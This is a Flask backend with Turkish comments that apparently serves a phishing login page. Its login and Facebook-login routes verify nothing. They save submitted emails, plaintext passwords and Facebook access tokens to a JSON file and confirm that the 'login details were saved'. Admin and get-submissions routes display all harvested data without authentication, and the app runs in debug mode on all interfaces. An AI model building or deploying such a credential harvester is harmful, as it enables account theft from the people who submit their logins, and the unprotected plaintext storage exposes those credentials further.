from flask import Flask, render_template, request, jsonify, send_from_directory
import json
import os
from datetime import datetime

# Flask uygulamasını static ve template dosyaları için doğru yollarla oluştur
app = Flask(__name__, static_folder='static', template_folder='templates')

# JSON dosyasının yolu
JSON_FILE = 'form_submissions.json'

def load_submissions():
    """JSON dosyasından mevcut verileri yükler"""
    if os.path.exists(JSON_FILE):
        try:
            with open(JSON_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return []
    return []

def save_submission(data):
    """Form verilerini JSON dosyasına kaydeder"""
    submissions = load_submissions()
    
    # Timestamp ekle
    data['timestamp'] = datetime.now().isoformat()
    data['id'] = len(submissions) + 1
    
    submissions.append(data)
    
    with open(JSON_FILE, 'w', encoding='utf-8') as f:
        json.dump(submissions, f, ensure_ascii=False, indent=2)

@app.route('/')
def index():
    """Ana sayfa"""
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Login form işlemlerini handle eder"""
    try:
        data = request.get_json()
        
        # Gelen verileri kontrol et
        if not data:
            return jsonify({'success': False, 'message': 'Veri gönderilmedi'}), 400
        
        # Form verilerini kaydet
        form_data = {
            'type': 'login',
            'email': data.get('email', ''),
            'password': data.get('password', ''),
            'remember_me': data.get('remember_me', False),
            'login_method': data.get('login_method', 'email')
        }
        
        save_submission(form_data)
        
        return jsonify({
            'success': True, 
            'message': 'Giriş bilgileri başarıyla kaydedildi!'
        })
        
    except Exception as e:
        return jsonify({
            'success': False, 
            'message': f'Hata oluştu: {str(e)}'
        }), 500

@app.route('/facebook-login', methods=['POST'])
def facebook_login():
    """Facebook login işlemlerini handle eder"""
    try:
        data = request.get_json()
        
        form_data = {
            'type': 'facebook_login',
            'login_method': 'facebook',
            'user_data': data.get('user_data', {}),
            'access_token': data.get('access_token', '')
        }
        
        save_submission(form_data)
        
        return jsonify({
            'success': True,
            'message': 'Facebook giriş bilgileri kaydedildi!'
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Hata oluştu: {str(e)}'
        }), 500

@app.route('/get-submissions')
def get_submissions():
    """Kaydedilen form verilerini döndürür (admin paneli için)"""
    submissions = load_submissions()
    return jsonify(submissions)

@app.route('/admin')
def admin():
    """Admin paneli - kaydedilen verileri göster"""
    submissions = load_submissions()
    return render_template('admin.html', submissions=submissions)

@app.route('/assets/<path:filename>')
def assets(filename):
    """Assets klasöründeki dosyaları serve et"""
    return send_from_directory('assets', filename)

if __name__ == '__main__':
    print("Flask uygulaması başlatılıyor...")
    print("Ana sayfa: http://localhost:5000")
    print("Admin paneli: http://localhost:5000/admin")
    print("Kaydedilen veriler: http://localhost:5000/get-submissions")
    app.run(debug=True, host='0.0.0.0', port=5000)
